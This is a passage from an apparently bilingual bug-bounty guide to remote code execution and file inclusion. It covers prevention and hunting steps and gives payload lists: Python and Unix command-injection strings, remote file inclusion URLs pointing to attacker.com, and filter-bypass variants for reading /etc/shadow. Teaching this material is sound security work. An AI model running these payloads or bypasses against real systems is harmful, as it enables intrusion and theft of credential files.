    folder. Then they could use the sequence
     ../
    to escape out of the
     lang
    directory and execute the malicious uploaded file on the target server:
    如果应用程序不对页面参数的可能值施加任何限制，攻击者可以通过利用上传功能来加载自己的页面。例如，example.com允许用户上传所有文件类型，然后将它们存储在/var/www/html/uploads/用户名目录中。攻击者可以将恶意的PHP文件上传到上传文件夹中。然后他们可以使用../序列从lang目录中逃脱并在目标服务器上执行恶意上传的文件。
http://example.com/?page=../uploads/USERNAME/malicious.php
    If the attacker loads this URL, the website will include the file
     /var/www/html/lang/../uploads/USERNAME/malicious.php
    , which points to
     /var/www/html/uploads/USERNAME/malicious.php
    .
    如果攻击者加载此URL，则网站将包含文件/var/www/html/lang/../uploads/USERNAME/malicious.php，该文件指向/var/www/html/uploads/USERNAME/malicious.php。
    Prevention
    To prevent code injections, you should avoid inserting user input into code that gets evaluated. Also, since user input can be passed into evaluated code through files that are parsed by the application, you should treat user-uploaded files as untrusted, as well as protect the integrity of existing system files that your programs execute, parse, or include.
    为了防止注入攻击，应避免将用户输入插入到将被评估的代码中。此外，由于用户输入可以通过应用程序解析的文件传递到评估的代码中，因此应将用户上传的文件视为不可信，并保护程序执行、解析或包含的现有系统文件的完整性。
    And to prevent file inclusion vulnerabilities, you should avoid including files based on user input. If that isn’t possible, disallow the inclusion of remote files and create an allowlist of local files that your programs can include. You can also limit file uploads to certain safe file types and host uploaded files in a separate environment than the application’s source code.
    为了防止文件包含漏洞，应避免基于用户输入包含文件。如果不可能，禁止包含远程文件，并创建一个白名单，其中包含您的程序可以包含的本地文件。您还可以将文件上传限制为某些安全文件类型，并将上传的文件托管在应用程序源代码的不同环境中。
    Also avoid calling system commands directly and use the programming language’s system APIs instead. Most programming languages have built-in functions that allow you to run system commands without risking command injection. For instance, PHP has a function named
     mkdir(
     DIRECTORY_NAME
     )
    . You can use it to create new directories instead of calling
     system("mkdir
     DIRECTORY_NAME
     ")
    .
    避免直接调用系统命令，而是使用编程语言的系统API。大多数编程语言都内置了函数，允许您运行系统命令而不会有命令注入的风险。例如，PHP有一个名为mkdir（DIRECTORY_NAME）的函数。您可以使用它来创建新目录，而不是调用system（"mkdir DIRECTORY_NAME"）。
    You should implement strong input validation for input passed into dangerous functions like
     eval()
    or
     include()
    . But this technique cannot be relied on as the only form of protection, because attackers are constantly coming up with inventive methods to bypass input validation.
    你应该在诸如eval()或include()等危险函数传入的输入上实施强输入验证。但是，这种技术不能作为唯一的保护形式，因为攻击者不断想出新的方法来绕过输入验证。
    Finally, staying up-to-date with patches will prevent your application’s dependencies from introducing RCE vulnerabilities. An application’s dependencies, such as open source packages and components, often introduce vulnerabilities into an application. This is also called a
     software supply chain attack
    .
    最后，保持补丁程序最新将防止您的应用程序依赖项引入RCE漏洞。 应用程序的依赖项，例如开源软件包和组件，通常会引入应用程序漏洞。 这也被称为软件供应链攻击。
    You can also deploy a
     web application firewall
     (
     WAF)
    to block suspicious attacks. Besides preventing RCEs, this could also help prevent some of the vulnerabilities I’ve discussed earlier in this book, such as SQL injection and XSS.
    你也可以部署Web应用防火墙（WAF）来阻止可疑攻击。除了防止RCE，这还可以帮助防止我在本书中讨论过的一些漏洞，例如SQL注入和XSS。
    If an attacker does achieve RCE on a machine, how could you minimize the harm they can cause? The
     principle of least privilege
    states that applications and processes should be granted only the privileges required to complete their tasks. It is a best practice that lowers the risk of system compromise during an attack because attackers won’t be able to gain access to sensitive files and operations even if they compromise a low-privileged user or process. For example, when a web application requires only read access to a file, it shouldn’t be granted any writing or execution permissions. That’s because, if an attacker hijacks an application that runs with high privilege, the attacker can gain its permissions.
    如果攻击者在一台计算机上实现了RCE，您可以如何减少他们可能造成的危害？最小权限原则表明，应仅授予应用程序和进程完成其任务所需的权限。这是一种最佳实践，可在攻击期间降低系统遭受妥协的风险，因为即使攻击者入侵了低权限用户或进程，他们也无法访问敏感文件和操作。例如，当Web应用程序仅需要读取文件时，不应授予任何写入或执行权限。这是因为，如果攻击者劫持以高权限运行的应用程序，则攻击者可以获得其权限。
    Hunting for RCEs
    Like many of the attacks we’ve covered thus far, RCEs have two types: classic and blind.
     Classic RCEs
    are the ones in which you can read the results of the code execution in a subsequent HTTP response, whereas
     blind RCEs
    occur when the malicious code is executed but the returned values of the execution do not appear in any HTTP response. Although attackers cannot witness the results of their executions, blind RCEs are just as dangerous as classic RCEs because they can enable attackers to spawn reverse shells or exfiltrate data to a remote server. Hunting for these two types of RCE is a similar process, but the commands or code snippets you’ll need to use to verify these vulnerabilities will differ.
    正如我们之前所介绍的攻击一样，RCEs 也有两种类型: 经典和盲目的。经典 RCEs 是指在随后的 HTTP 响应中可以读取代码执行的结果，而盲目 RCEs 是指虽然执行了恶意代码，但是执行的返回值不会出现在任何 HTTP 响应结果中。尽管攻击者无法看到执行结果，但盲目 RCEs 与经典 RCEs 一样危险，因为它们可以使攻击者生成反向 shell 或向远程服务器外泄数据。寻找这两种类型的 RCEs 的过程是相似的，但用于验证这些漏洞的命令或代码段将有所不同。
    Here are some commands you can use when attacking Linux servers. When hunting for a classic RCE vulnerability, all you need to do to verify the vulnerability is to execute a command such as
     whoami
    , which outputs the username of the current user. If the response contains the web server’s username, such as
     www-data
    , you’ve confirmed the RCE, as the command has successfully run. On the other hand, to validate a blind RCE, you’ll need to execute a command that influences system behavior, like
     sleep 5
    , which delays the response by five seconds. Then if you experience a five-second delay before receiving a response, you can confirm the vulnerability. Similar to the blind techniques we used to exploit other vulnerabilities, you can also set up a listener and attempt to trigger out-of-band interaction from the target server.
    这里是攻击Linux服务器时可用的一些命令。在寻找传统的RCE漏洞时，您只需要执行一个命令，如whoami，它会输出当前用户的用户名来验证漏洞。如果响应中包含Web服务器的用户名，例如www-data，则已确认RCE，因为命令已成功运行。另一方面，要验证盲目RCE，您需要执行影响系统行为的命令，如sleep 5，它会将响应延迟五秒钟。然后，如果您在接收到响应之前经历了五秒钟的延迟，您可以确认漏洞。与我们用来利用其他漏洞的盲目技术类似，您还可以设置侦听器并尝试触发来自目标服务器的带外交互。
    Step 1: Gather Information About the Target
    The first step to finding any vulnerability is to gather information about the target. When hunting for RCEs, this step is especially important because the route to achieving an RCE is extremely dependent on the way the target is built. You should find out information about the web server, programming language, and other technologies used by your current target. Use the recon steps outlined in
     Chapter 5
    to do this.
    寻找漏洞的第一步是收集有关目标的信息。寻找RCE时，这一步尤其重要，因为实现RCE的路径极大程度上取决于目标的构建方式。您应该了解有关当前目标使用的Web服务器、编程语言和其他技术的信息。请使用第5章中概述的侦察步骤来完成。
    Step 2: Identify Suspicious User Input Locations
    As with finding many other vulnerabilities, the next step to finding any RCE is to identify the locations where users can submit input to the application. When hunting for code injections, take note of every direct user-input location, including URL parameters, HTTP headers, body parameters, and file uploads. Sometimes applications parse user-supplied files and concatenate their contents unsafely into executed code, so any input that is eventually passed into commands is something you should look out for.
    与发现其他漏洞一样，找到RCE的下一步是确定用户可以向应用程序提交输入的位置。在寻找代码注入时，要注意每个直接的用户输入位置，包括URL参数，HTTP头，正文参数和文件上传。有时，应用程序会解析用户提供的文件并不安全地将其内容连接到执行的代码中，因此您应该注意任何最终传递到命令中的输入。
    To find potential file inclusion vulnerabilities, check for input locations being used to determine filenames or paths, as well as any file-upload functionalities in the application.
    检查输入位置是否用于确定文件名或路径，以及应用程序中的任何文件上传功能，以查找潜在的文件包含漏洞。
    Step 3: Submit Test Payloads
    The next thing you should do is to submit test payloads to the application. For code injection vulnerabilities, try payloads that are meant to be interpreted by the server as code and see if they get executed. For example, here’s a list of payloads you could use:
    接下来你需要做的事情是向应用程序提交测试负载。对于代码注入漏洞，试试那些被服务器解释为代码的负载，并看它们是否被执行。例如，以下是你可以使用的负载列表：
     Python payloads
    Python负载
    This command is designed to print the string
     RCE test!
    if Python execution succeeds:
    如果Python执行成功，则此命令旨在打印字符串'RCE测试！'：
print("RCE test!")
    This command prints the result of the system command
     ls
    :
    这个命令将打印出系统命令 `ls` 的结果：
"__import__('os').system('ls')"
    This command delays the response for 10 seconds:
    这个命令会将响应延迟10秒钟：
"__import__('os').system('sleep 10')"
     PHP payloads
    PHP载荷
    This command is designed to print the local PHP configuration information if execution succeeds:
    如果执行成功，该命令旨在打印本地PHP配置信息。
phpinfo();
    This command prints the result of the system command
     ls
    :
    该命令打印系统命令“ls”的结果： 
这个命令打印出“ls”命令的结果。
    This command delays the response for 10 seconds:
    这个命令会延迟回应10秒钟：
     Unix payloads
    Unix载荷
    This command prints the result of the system command
     ls
    :
    该命令会打印系统命令“ls”的结果：
;ls;
    These commands delay the response for 10 seconds:
    这些命令会延迟10秒钟的响应：
| sleep 10;
& sleep 10;
` sleep 10;`
$(sleep 10)
    For file inclusion vulnerabilities, you should try to make the endpoint include either a remote file or a local file that you can control. For example, for remote file inclusion, you could try several forms of a URL that points to your malicious file hosted offsite:
    对于文件包含漏洞，您应该尝试使终端点包含一个远程文件或本地文件，您可以控制。例如，对于远程文件包含，您可以尝试多种形式的URL，指向您位于外部托管的恶意文件。
http://example.com/?page=http://attacker.com/malicious.php
http://example.com/?page=http:attacker.com/malicious.php
    And for local file inclusion vulnerabilities, try different URLs pointing to local files that you control:
    尝试不同的指向您控制的本地文件的URL，以处理本地文件包含漏洞问题：
http://example.com/?page=../uploads/malicious.php
http://example.com/?page=..%2fuploads%2fmalicious.php
    You can use the protection-bypass techniques you learned in
     Chapter 13
    to construct different forms of the same URL.
    你可以使用第13章中学到的保护绕过技巧来构建同一URL的不同形式。
    Step 4: Confirm the Vulnerability
    Finally, confirm the vulnerability by executing harmless commands like
     whoami
    ,
     ls
    , and
     sleep 5
    .
    最后，通过执行无害命令（例如whoami、ls和sleep 5）来确认漏洞。
    Escalating the Attack
    Be extra cautious when escalating RCE vulnerabilities. Most companies would prefer that you don’t try to escalate them at all because they don’t want someone poking around systems that contain confidential data. During a typical penetration test, a hacker will often try to figure out the privileges of the current user and attempt privilege-escalation attacks after they gain RCE. But in a bug bounty context, this isn’t appropriate. You might accidentally read sensitive information about customers or cause damage to the systems by modifying a critical file. It’s important that you carefully read the bounty program rules so you don’t cross the lines.
    在升级RCE漏洞时要格外小心。大多数公司都希望您根本不要尝试升级它们，因为他们不希望有人在含机密数据的系统中进行探测。在典型的渗透测试中，黑客经常会尝试弄清当前用户的特权，并在获得RCE后尝试特权升级攻击。但在漏洞赏金的情况下，这是不合适的。您可能会意外读取客户的敏感信息，或通过修改关键文件来损坏系统。重要的是，您仔细阅读赏金计划规则，以免越界。
    For classic RCEs, create a proof of concept that executes a harmless command like
     whoami
    or
     ls
    . You can also prove you’ve found an RCE by reading a common system file such as
     /etc/passwd
    . You can use the
     cat
    command to read a system file:
    针对经典的远程代码执行（RCE）漏洞，需创建一个可执行无害命令（如whoami或ls）的概念证明。也可通过读取常见系统文件（如/etc/passwd）来验证是否发现了RCE漏洞。可以使用cat命令来读取系统文件。
cat /etc/passwd
    On Linux systems, the
     /etc/passwd
    file contains a list of the system’s accounts and their user IDs, group IDs, home directories, and default shells. This file is usually readable without special privileges, so it’s a good file to try to access first.
    在Linux系统中，/etc/passwd文件包含系统帐户及其用户ID、组ID、主目录和默认Shell的列表。这个文件通常可以在没有特殊权限的情况下进行读取，因此它是一个首要尝试访问的好文件。
    Finally, you can create a file with a distinct filename on the system, such as
     rce_by_YOUR_NAME.txt
    so it’s clear that this file is a part of your POC. You can use the
     touch
    command to create a file with the specified name in the current directory:
    最后，您可以在系统上创建一个具有不同文件名的文件，例如rce_by_YOUR_NAME.txt，以便清楚表明该文件是您的POC的一部分。您可以使用touch命令在当前目录中创建具有指定名称的文件：
touch rce_by_YOUR_NAME.txt
    For blind RCEs, create a POC that executes the
     sleep
    command. You can also create a reverse shell on the target machine that connects back to your system for a more impactful POC. However, this is often against program rules, so be sure to check with the program beforehand.
    针对盲目RCE漏洞，请创建一个执行睡眠命令的POC。你也可以在目标机器上创建一个反向shell，使其连接回你的系统，以创建一个更有影响力的POC。但是，这通常违反程序规则，所以请提前与程序确认。
    It’s easy to step over the bounds of the bounty policy and cause unintended damage to the target site when creating POCs for RCE vulnerabilities. When you create your POC, make sure that your payload executes a harmless command and that your report describes the steps needed to achieve RCE. Often, reading a nonsensitive file or creating a file under a random path is enough to prove your findings.
    在创建用于 RCE 漏洞的 POC 时，容易超出赏金政策的限制并对目标站点造成意外损害。创建您的 POC 时，请确保您的负载执行无害命令，并且您的报告描述了实现 RCE 的步骤。通常，阅读非敏感文件或在随机路径下创建文件就足以证明您的发现。
    Bypassing RCE Protection
    Many applications have caught on to the dangers of RCE and employ either input validation or a firewall to stop potentially malicious requests. But programming languages are often quite flexible, and that enables us to work within the bounds of the input validation rules to make our attack work! Here are some basic input validation bypasses you can try in case the application is blocking your payloads.
    许多应用程序已经意识到了RCE的危险，并采用输入验证或防火墙来阻止潜在的恶意请求。但是编程语言往往非常灵活，这使我们能够在输入验证规则范围内工作，以使我们的攻击有效！以下是一些基本的输入验证绕过方式，如果应用程序正在阻止您的有效载荷，请尝试。
    For Unix system commands, you can insert quotes and double quotes without changing the command’s behavior. You can also use wildcards to substitute for arbitrary characters if the system is filtering out certain strings. Finally, any empty command substitution results can be inserted into the string without changing the results. For example, the following commands will all print the contents of
     /etc/shadow
    :
    对于Unix系统命令，您可以插入引号和双引号，而不改变命令的行为。如果系统过滤某些字符串，还可以使用通配符替换任意字符。最后，任何空的命令替换结果都可以插入到字符串中，而不影响结果。例如，以下命令将打印/etc/shadow的内容。
cat /etc/shadow
cat "/e"tc'/shadow'
cat /etc/sh*dow
cat /etc/sha``dow
cat /etc/sha$()dow
cat /etc/sha${}dow
    You can also vary the way you write the same command in PHP. For example, PHP allows you to concatenate function names as strings. You can even hex-encode function names, or insert PHP comments in commands without changing their outcome:
    你还可以变换PHP中编写同一命令的方式。例如，PHP允许你将函数名拼接为字符串。你甚至可以十六进制编码函数名称，或在命令中插入PHP注释而不影响命令结果。
/* Text surrounded by these brackets are comments in PHP. */
    For example, say you want to execute this system command in PHP:
    例如，假设你想在 PHP 中执行这个系统命令：
system('cat /etc/shadow');
    The following example executes a
     system
    command by concatenating the strings
     sys